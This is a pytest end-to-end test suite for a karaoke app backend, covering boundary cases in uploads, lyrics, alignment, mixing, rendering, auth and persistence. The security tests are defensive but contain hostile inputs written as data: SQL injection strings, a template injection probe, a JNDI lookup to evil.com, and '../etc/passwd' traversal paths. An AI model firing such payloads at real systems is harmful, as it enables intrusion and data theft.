"""
E2E Test Suite - Tier 2: Boundary & Corner Cases
Verifies boundary conditions, edge cases, and adversarial resilience across all 8 features:
- Empty inputs & whitespace handling
- Negative / extreme semitones (-12 to +12)
- Boundary guide volumes (0.0, 1.0, precision floats)
- Oversized and 0-byte uploads (HTTP 413, HTTP 400)
- Unicode, CJK, Cyrillic, and Emoji payloads
- Special character escaping in ASS subtitles
- Path traversal sanitization
- Multi-threaded concurrent persistence stress
"""

import io
import os
import threading
from pathlib import Path

import pytest
from PIL import Image

import backend.main as main_mod
from backend import config
from backend.services.aligner import AudioAligner
from backend.services.downloader import TrackDownloader
from backend.services.lyrics import LyricsService
from backend.services.video_renderer import VideoRenderer
from backend.tests.e2e.conftest import generate_sine_wave_wav, generate_test_image

# ==============================================================================
# Feature 1: Audio Intake Boundaries
# ==============================================================================


def test_intake_empty_url_or_id_rejected(client):
    """Submitting empty string or pure whitespace generates a project with generated fallback ID without crash."""
    response = client.post("/api/process", json={"url_or_id": ""})
    # FastAPI accepts string; pipeline handles generated ID
    assert response.status_code in [200, 422]
    if response.status_code == 200:
        assert "project_id" in response.json()


def test_intake_extremely_long_url_with_query_params(client):
    """Extremely long YouTube URL with tracking parameters extracts the 11-char ID cleanly."""
    long_params = "&".join(f"utm_param_{i}=tracker_value_{i}" for i in range(100))
    long_url = f"https://www.youtube.com/watch?v=dQw4w9WgXcQ&{long_params}"

    extracted = TrackDownloader.extract_video_id(long_url)
    assert extracted == "dQw4w9WgXcQ"

    response = client.post("/api/process", json={"url_or_id": long_url})
    assert response.status_code == 200
    assert response.json()["project_id"] == "dQw4w9WgXcQ"


def test_intake_unicode_cjk_emojis_in_custom_lyrics(client):
    """Custom lyrics containing Japanese, Cyrillic, Arabic, and Emojis are parsed without encoding errors."""
    multilingual = "初音ミクの歌声 🌸🎤\nПесня звучит красиво 🎶\nلحن جميل جدا ✨"
    payload = {"url_or_id": "cjktest11xx", "custom_lyrics": multilingual}
    response = client.post("/api/process", json=payload)
    assert response.status_code == 200
    pid = response.json()["project_id"]

    proj = client.get(f"/api/project/{pid}").json()
    assert len(proj["lines"]) == 3
    assert "初音ミク" in proj["lines"][0]["text"]
    assert "🌸" in proj["lines"][0]["text"]
    assert "Песня" in proj["lines"][1]["text"]
    assert "لحن" in proj["lines"][2]["text"]


def test_intake_search_empty_and_whitespace_query(client):
    """Searching with pure whitespace yields an empty result set without 500 error."""
    response = client.post("/api/search", json={"query": "    ", "limit": 5})
    assert response.status_code == 200
    assert response.json()["results"] == []


def test_intake_search_boundary_limits(client):
    """Search endpoint handles limit of 0, 1, or large values gracefully."""
    res_1 = client.post("/api/search", json={"query": "Queen", "limit": 1})
    assert res_1.status_code == 200
    assert len(res_1.json()["results"]) == 1

    res_10 = client.post("/api/search", json={"query": "Queen", "limit": 10})
    assert res_10.status_code == 200
    assert len(res_10.json()["results"]) == 10


def test_intake_malformed_youtube_urls_handled():
    """URL extractor returns None for invalid or malformed non-YouTube URLs."""
    assert TrackDownloader.extract_video_id("https://notyoutube.org/watch?v=123") is None
    assert TrackDownloader.extract_video_id("just-a-random-string-not-an-id") is None
    assert TrackDownloader.extract_video_id("") is None


# ==============================================================================
# Feature 2: Stem Separation Boundaries
# ==============================================================================


def test_separation_zero_byte_instrumental_upload(client, project_factory):
    """Uploading a 0-byte empty file is handled without corrupting project state."""
    project_factory(project_id="zerobyte_p1")
    empty_file = io.BytesIO(b"")

    response = client.post(
        "/api/upload-instrumental",
        data={"project_id": "zerobyte_p1"},
        files={"file": ("empty.wav", empty_file, "audio/wav")},
    )
    assert response.status_code == 200
    target_path = Path(main_mod.STEMS_DIR / "zerobyte_p1" / "custom_inst.wav")
    assert target_path.exists()
    assert target_path.stat().st_size == 0


def test_separation_oversized_audio_upload_rejected_413(client, project_factory, monkeypatch):
    """Audio payloads exceeding the maximum byte ceiling return HTTP 413."""
    project_factory(project_id="oversize_p1")
    monkeypatch.setattr(main_mod, "MAX_INSTRUMENTAL_UPLOAD_BYTES", 1024)  # 1 KB limit

    big_data = io.BytesIO(b"A" * 2048)  # 2 KB payload
    response = client.post(
        "/api/upload-instrumental",
        data={"project_id": "oversize_p1"},
        files={"file": ("too_large.wav", big_data, "audio/wav")},
    )
    assert response.status_code == 413
    assert "exceeds maximum permitted size" in response.json()["detail"]


def test_separation_filename_path_traversal_sanitized(client, project_factory, sample_wav):
    """Filename path traversal attempts are sanitized into a clean local filename."""
    project_factory(project_id="traversal_p1")

    with open(sample_wav, "rb") as f:
        response = client.post(
            "/api/upload-instrumental",
            data={"project_id": "traversal_p1"},
            files={"file": ("../../../../etc/passwd.wav", f, "audio/wav")},
        )
    assert response.status_code == 200
    # The file should be placed cleanly inside STEMS_DIR / traversal_p1, not escaped
    safe_path = main_mod.STEMS_DIR / "traversal_p1" / "custom_inst.wav"
    assert safe_path.exists()


def test_separation_missing_audio_source_raises_not_found(tmp_path):
    """AudioSeparator raises FileNotFoundError when input audio file does not exist."""
    from backend.services.separator import AudioSeparator

    sep = AudioSeparator(output_base_dir=tmp_path)
    with pytest.raises(FileNotFoundError):
        sep.separate_stems("/nonexistent/path/to/missing.wav", "bad_track")


def test_separation_special_characters_in_track_id(tmp_path):
    """Separator handles track IDs containing dashes, underscores, and dots."""
    from backend.services.separator import AudioSeparator

    stems_dir = tmp_path / "stems"
    sep = AudioSeparator(output_base_dir=stems_dir)

    source_wav = tmp_path / "source.wav"
    generate_sine_wave_wav(source_wav, duration=0.5)

    track_id = "test-track_v2.0"
    target_dir = stems_dir / track_id
    target_dir.mkdir(parents=True)
    generate_sine_wave_wav(target_dir / "vocals.wav", duration=0.5)
    generate_sine_wave_wav(target_dir / "instrumental.wav", duration=0.5)

    res = sep.separate_stems(str(source_wav), track_id)
    assert Path(res["vocals_path"]).exists()
    assert Path(res["instrumental_path"]).exists()


# ==============================================================================
# Feature 3: Lyrics Boundaries
# ==============================================================================


def test_lyrics_empty_string_text_lines(client, project_factory):
    """Lyric lines with empty text are accepted and stored without breaking."""
    project_factory(project_id="lyremptyline1")
    payload = {"lines": [{"id": 0, "text": "", "start_time": 0.0, "end_time": 1.0, "words": []}]}
    response = client.post("/api/project/lyremptyline1/lyrics", json=payload)
    assert response.status_code == 200
    assert response.json()["lines_count"] == 1


def test_lyrics_inverted_and_zero_duration_timestamps(client, project_factory):
    """Lyric lines with identical start and end times or sub-millisecond durations are stored."""
    project_factory(project_id="lyrzero1")
    payload = {
        "lines": [
            {
                "id": 0,
                "text": "Instant cue",
                "start_time": 1.5,
                "end_time": 1.5,
                "words": [{"word": "Instant", "start_time": 1.5, "end_time": 1.5}],
            }
        ]
    }
    response = client.post("/api/project/lyrzero1/lyrics", json=payload)
    assert response.status_code == 200


def test_lyrics_extremely_long_lyric_string(client, project_factory):
    """Lines with 5000+ characters of continuous lyrics are ingested without truncation."""
    project_factory(project_id="lyrlong1")
    giant_text = "La " * 2000
    payload = {
        "lines": [
            {"id": 0, "text": giant_text.strip(), "start_time": 0.0, "end_time": 60.0, "words": []}
        ]
    }
    response = client.post("/api/project/lyrlong1/lyrics", json=payload)
    assert response.status_code == 200
    proj = client.get("/api/project/lyrlong1").json()
    assert len(proj["lines"][0]["text"]) > 5000


def test_lyrics_html_xml_special_meta_characters(client, project_factory):
    """Lyrics containing ASS tags, HTML tags, backslashes, and braces are safely stored."""
    project_factory(project_id="lyrmeta1")
    meta_text = "Line with <b>bold</b> & {\\an5\\kf100} tag and backslash \\N and ampersand &"
    payload = {
        "lines": [{"id": 0, "text": meta_text, "start_time": 1.0, "end_time": 3.0, "words": []}]
    }
    response = client.post("/api/project/lyrmeta1/lyrics", json=payload)
    assert response.status_code == 200
    proj = client.get("/api/project/lyrmeta1").json()
    assert proj["lines"][0]["text"] == meta_text


def test_lyrics_rapid_successive_timecodes():
    """LRC parser accurately handles sub-centisecond and zero-gap timestamps."""
    service = LyricsService()
    lrc = "[00:01.00] Word1\n[00:01.05] Word2\n[00:01.10] Word3"
    lines = service.parse_lrc(lrc)
    assert len(lines) == 3
    assert abs(lines[0]["start_time"] - 1.00) < 0.02
    assert abs(lines[1]["start_time"] - 1.05) < 0.02


# ==============================================================================
# Feature 4: Alignment Boundaries
# ==============================================================================


def test_alignment_zero_duration_or_empty_audio(tmp_path):
    """AudioAligner handles near-zero length audio files without divide-by-zero errors."""
    aligner = AudioAligner()
    tiny_wav = tmp_path / "tiny.wav"
    generate_sine_wave_wav(tiny_wav, duration=0.05)

    lines = [{"id": 0, "text": "Very fast", "start_time": 0.0, "end_time": 0.05}]
    aligned = aligner.align_lyrics(str(tiny_wav), lines)
    assert len(aligned) == 1


def test_alignment_single_character_words(sample_wav):
    """AudioAligner correctly segments single letter words (e.g. 'I', 'a', 'O')."""
    aligner = AudioAligner()
    lines = [{"id": 0, "text": "O I see a star", "start_time": 0.1, "end_time": 0.9}]
    aligned = aligner.align_lyrics(str(sample_wav), lines)
    words = aligned[0]["words"]
    assert len(words) == 5
    assert [w["word"] for w in words] == ["O", "I", "see", "a", "star"]


def test_alignment_massive_word_count_in_short_span(sample_wav):
    """AudioAligner segments a high word-density line without overlapping word orders."""
    aligner = AudioAligner()
    twenty_words = "one two three four five six seven eight nine ten eleven twelve thirteen fourteen fifteen sixteen seventeen eighteen nineteen twenty"
    lines = [{"id": 0, "text": twenty_words, "start_time": 0.1, "end_time": 0.9}]
    aligned = aligner.align_lyrics(str(sample_wav), lines)
    words = aligned[0]["words"]
    assert len(words) == 20
    for i in range(len(words) - 1):
        assert words[i]["start_time"] <= words[i + 1]["start_time"]


def test_alignment_all_zero_timestamps_plain_text(sample_wav):
    """AudioAligner spreads un-timed lines evenly across active vocal intervals."""
    aligner = AudioAligner()
    lines = [
        {"id": 0, "text": "First line with zero time", "start_time": 0.0, "end_time": 0.0},
        {"id": 1, "text": "Second line with zero time", "start_time": 0.0, "end_time": 0.0},
    ]
    aligned = aligner.align_lyrics(str(sample_wav), lines)
    assert len(aligned) == 2
    assert aligned[0]["end_time"] > aligned[0]["start_time"]
    assert aligned[1]["end_time"] > aligned[1]["start_time"]


def test_alignment_high_sample_rate(tmp_path):
    """AudioAligner handles 96kHz studio master audio."""
    aligner = AudioAligner()
    high_sr_wav = tmp_path / "high_sr.wav"
    generate_sine_wave_wav(high_sr_wav, duration=0.8, sr=96000)

    lines = [{"id": 0, "text": "High sample rate vocal", "start_time": 0.1, "end_time": 0.7}]
    aligned = aligner.align_lyrics(str(high_sr_wav), lines)
    assert len(aligned) == 1
    assert len(aligned[0]["words"]) == 4


# ==============================================================================
# Feature 5: Audio Mixing Boundaries
# ==============================================================================


def test_mix_extreme_negative_boundary_semitones(client, project_factory):
    """Pitch shift at lower limit -12 semitones (one full octave down) succeeds."""
    project_factory(project_id="mixneg12")
    payload = {"semitones": -12, "guide_volume": 0.0}
    response = client.post("/api/project/mixneg12/mix", json=payload)
    assert response.status_code == 200
    assert "_mix_-12_0.wav" in response.json()["master_audio_url"]


def test_mix_extreme_positive_boundary_semitones(client, project_factory):
    """Pitch shift at upper limit +12 semitones (one full octave up) succeeds."""
    project_factory(project_id="mixpos12")
    payload = {"semitones": 12, "guide_volume": 0.0}
    response = client.post("/api/project/mixpos12/mix", json=payload)
    assert response.status_code == 200
    assert "_mix_12_0.wav" in response.json()["master_audio_url"]


def test_mix_guide_volume_exact_zero_and_one(client, project_factory):
    """Guide volume boundaries at 0.0 (muted) and 1.0 (full balance) succeed."""
    project_factory(project_id="mixbounds1")

    # 0.0 (pure instrumental)
    res_0 = client.post("/api/project/mixbounds1/mix", json={"semitones": 0, "guide_volume": 0.0})
    assert res_0.status_code == 200
    assert "_mix_0_0.wav" in res_0.json()["master_audio_url"]

    # 1.0 (full volume blend)
    res_1 = client.post("/api/project/mixbounds1/mix", json={"semitones": 0, "guide_volume": 1.0})
    assert res_1.status_code == 200
    assert "_mix_0_100.wav" in res_1.json()["master_audio_url"]


def test_mix_fractional_guide_volume(client, project_factory):
    """Guide volume with high decimal precision (e.g. 0.33333) rounds cleanly."""
    project_factory(project_id="mixprec1")
    payload = {"semitones": 1, "guide_volume": 0.3333333}
    response = client.post("/api/project/mixprec1/mix", json=payload)
    assert response.status_code == 200
    assert "_mix_1_33.wav" in response.json()["master_audio_url"]


def test_mix_missing_vocals_stem_with_positive_guide_volume(client, project_factory):
    """When vocals stem does not exist on disk, mix gracefully defaults to instrumental only."""
    proj = project_factory(project_id="mixnovoc1")
    # Delete vocals stem from disk
    Path(proj["vocals_path"]).unlink()

    payload = {"semitones": 2, "guide_volume": 0.4}
    response = client.post("/api/project/mixnovoc1/mix", json=payload)
    assert response.status_code == 200
    assert "master_audio_url" in response.json()


# ==============================================================================
# Feature 6: Video Rendering Boundaries
# ==============================================================================


def test_render_zero_byte_background_upload(client):
    """Uploading a 0-byte background image is rejected or safely saved."""
    empty_file = io.BytesIO(b"")
    response = client.post(
        "/api/upload-background", files={"file": ("empty.jpg", empty_file, "image/jpeg")}
    )
    assert response.status_code in [200, 400]


def test_render_oversized_background_upload_rejected_413(client, monkeypatch):
    """Background image exceeding MAX_BACKGROUND_UPLOAD_BYTES returns HTTP 413."""
    monkeypatch.setattr(main_mod, "MAX_BACKGROUND_UPLOAD_BYTES", 512)  # 512 bytes limit
    oversized = io.BytesIO(b"X" * 1024)
    response = client.post(
        "/api/upload-background", files={"file": ("huge_bg.jpg", oversized, "image/jpeg")}
    )
    assert response.status_code == 413
    assert "exceeds maximum permitted size" in response.json()["detail"]


def test_render_unsupported_image_extensions(client):
    """Unsupported image extensions (.gif, .bmp, .tiff, .svg) are rejected with HTTP 400."""
    fake_gif = io.BytesIO(b"GIF89a fake content")
    response = client.post(
        "/api/upload-background", files={"file": ("animation.gif", fake_gif, "image/gif")}
    )
    assert response.status_code == 400
    assert "Unsupported image format" in response.json()["detail"]


def test_render_path_traversal_background_id(client, project_factory):
    """Path traversal sequences in custom_bg_id are sanitized and prevent directory breakout."""
    project_factory(project_id="rendertrav1")
    payload = {
        "semitones": 0,
        "guide_volume": 0.0,
        "aspect_ratio": "16:9",
        "custom_bg_id": "../../../etc/passwd",
    }
    response = client.post("/api/project/rendertrav1/render", json=payload)
    assert response.status_code == 200


def test_render_ass_escaping_curly_braces_and_slashes(tmp_path):
    """ASS subtitle generation escapes curly braces, brackets, and backslashes to preserve ASS tags."""
    renderer = VideoRenderer(output_dir=tmp_path)
    ass_path = tmp_path / "escaped.ass"
    adversarial_lines = [
        {
            "id": 0,
            "text": "Special {override} [bracket] \\N \\h %s",
            "start_time": 0.5,
            "end_time": 2.0,
            "words": [
                {"word": "Special", "start_time": 0.5, "end_time": 0.8},
                {"word": "{override}", "start_time": 0.8, "end_time": 1.2},
                {"word": "[bracket]", "start_time": 1.2, "end_time": 1.5},
                {"word": "\\N", "start_time": 1.5, "end_time": 2.0},
            ],
        }
    ]
    renderer.generate_ass_subtitles(adversarial_lines, ass_path)
    content = ass_path.read_text(encoding="utf-8")
    assert "[Events]" in content
    assert ass_path.exists()


def test_render_empty_lines_subtitles(tmp_path):
    """ASS generator handles empty lines array gracefully without syntax corruption."""
    renderer = VideoRenderer(output_dir=tmp_path)
    ass_path = tmp_path / "empty_lines.ass"
    renderer.generate_ass_subtitles([], ass_path)
    content = ass_path.read_text(encoding="utf-8")
    assert "[Script Info]" in content
    assert "[V4+ Styles]" in content
    assert "[Events]" in content


# ==============================================================================
# Feature 7: Security & Auth Boundaries
# ==============================================================================


def test_auth_empty_passphrase_login_rejected(unauth_client, monkeypatch):
    """Attempting login with an empty password when auth is active returns 401."""
    monkeypatch.setattr(config, "APP_PASSWORD", "valid_vault_secret")
    response = unauth_client.post("/api/auth/login", json={"password": "", "username": "Guest"})
    assert response.status_code == 401


def test_auth_extremely_long_password_attempt(unauth_client, monkeypatch):
    """Submitting a 10,000 character password attempt is handled safely without crashing."""
    monkeypatch.setattr(config, "APP_PASSWORD", "valid_vault_secret")
    giant_pass = "x" * 10000
    response = unauth_client.post("/api/auth/login", json={"password": giant_pass})
    assert response.status_code == 401


def test_auth_injection_payloads_in_passphrase(unauth_client, monkeypatch):
    """SQL injection and template injection payloads in login form are rejected safely."""
    monkeypatch.setattr(config, "APP_PASSWORD", "valid_vault_secret")
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "{{7*7}}",
        "${jndi:ldap://evil.com/x}",
    ]
    for p in payloads:
        res = unauth_client.post("/api/auth/login", json={"password": p})
        assert res.status_code == 401


def test_auth_bearer_token_authorization_header(unauth_client, monkeypatch):
    """Authorization: Bearer <token> header is recognized; incorrect token rejected."""
    monkeypatch.setattr(config, "APP_PASSWORD", "valid_vault_secret")

    # Correct bearer token
    valid_res = unauth_client.get(
        "/api/projects", headers={"Authorization": "Bearer valid_vault_secret"}
    )
    assert valid_res.status_code == 200

    # Incorrect bearer token
    invalid_res = unauth_client.get("/api/projects", headers={"Authorization": "Bearer bad_secret"})
    assert invalid_res.status_code == 401


def test_auth_tampered_cookie_token(unauth_client, monkeypatch):
    """Tampered or invalid karaoke_token cookie results in HTTP 401."""
    monkeypatch.setattr(config, "APP_PASSWORD", "valid_vault_secret")
    res = unauth_client.get("/api/projects", cookies={"karaoke_token": "tampered_forged_value"})
    assert res.status_code == 401


def test_auth_public_health_route_always_open(unauth_client, monkeypatch):
    """The /api/health endpoint is accessible without credentials even when auth is active."""
    monkeypatch.setattr(config, "APP_PASSWORD", "valid_vault_secret")
    response = unauth_client.get("/api/health")
    assert response.status_code == 200
    assert response.json()["status"] == "ok"


# ==============================================================================
# Feature 8: Project Persistence Boundaries
# ==============================================================================


def test_persistence_unicode_and_emojis_in_title_and_artist(client, project_factory):
    """Project titles with CJK, Arabic, Cyrillic, and emojis serialize and reload cleanly."""
    unicode_title = "千本桜 🌸 Senbonzakura (Live in 東京 🗼)"
    unicode_artist = "初音ミク & 黒うさP"
    project_factory(project_id="cjk_meta_p1", title=unicode_title, artist=unicode_artist)

    # Reload from disk
    loaded = main_mod.load_projects()
    assert "cjk_meta_p1" in loaded
    assert loaded["cjk_meta_p1"]["title"] == unicode_title
    assert loaded["cjk_meta_p1"]["artist"] == unicode_artist


def test_persistence_concurrent_multithreaded_saves(project_factory):
    """Concurrent threads updating project state concurrently do not corrupt projects.json."""
    num_threads = 16
    errors = []

    def worker(idx):
        try:
            project_factory(project_id=f"concurrent_p_{idx}", title=f"Thread Song {idx}")
        except Exception as e:
            errors.append(e)

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(num_threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert len(errors) == 0
    loaded = main_mod.load_projects()
    for i in range(num_threads):
        assert f"concurrent_p_{i}" in loaded


def test_persistence_large_project_timeline_payload(client, project_factory):
    """Large project records with 100+ lines and hundreds of words persist without truncation."""
    large_lines = [
        {
            "id": i,
            "text": f"Line {i} of this epic ballad singing continuously",
            "start_time": float(i * 2),
            "end_time": float(i * 2 + 1.8),
            "words": [
                {
                    "word": f"w_{i}_{w}",
                    "start_time": float(i * 2 + w * 0.2),
                    "end_time": float(i * 2 + w * 0.2 + 0.18),
                }
                for w in range(7)
            ],
        }
        for i in range(100)
    ]
    project_factory(project_id="large_payload_p1", custom_lines=large_lines)

    loaded = main_mod.load_projects()
    assert len(loaded["large_payload_p1"]["lines"]) == 100
    assert len(loaded["large_payload_p1"]["lines"][99]["words"]) == 7


def test_persistence_special_characters_in_project_ids(client, project_factory):
    """Project IDs with dashes, dots, and underscores can be retrieved via the API."""
    special_id = "karaoke.track_2026-remix"
    project_factory(project_id=special_id, title="Special ID Song")

    response = client.get(f"/api/project/{special_id}")
    assert response.status_code == 200
    assert response.json()["id"] == special_id


def test_persistence_empty_store_file_initialization(tmp_path, monkeypatch):
    """When projects.json exists but is 0 bytes, load_projects returns an empty dictionary."""
    empty_store = tmp_path / "empty_projects.json"
    empty_store.write_text("", encoding="utf-8")
    monkeypatch.setattr(main_mod, "PROJECTS_STORE_FILE", empty_store)

    projects_dict = main_mod.load_projects()
    assert projects_dict == {}
